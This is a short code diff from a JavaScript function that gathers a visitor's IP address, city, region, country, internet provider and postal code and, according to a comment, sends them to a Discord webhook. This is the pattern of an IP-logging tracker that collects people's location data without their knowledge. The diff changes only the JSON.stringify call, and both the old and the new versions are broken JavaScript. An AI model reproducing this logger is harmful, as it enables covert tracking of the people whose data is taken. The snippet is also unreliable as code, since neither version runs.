@@ -9,14 +9,14 @@ async function getIPAndLocationAndSendToDiscord() {
         
         // Construct the message with content in a code block
         const message = "```json\n" +
-                        JSON.stringify({
+                        JSON.stringify(
                             "City": data.city,
                             "Region": data.regionName,
                             "Country": data.country,
                             "Internet Provider": data.org,
                             "Postal Code": data.zip,
                             "IP Address": data.query
-                        , null, 2}) +
+                        , null, 2) +
                         "\n```";
         
         // Send the message to Discord using a webhook
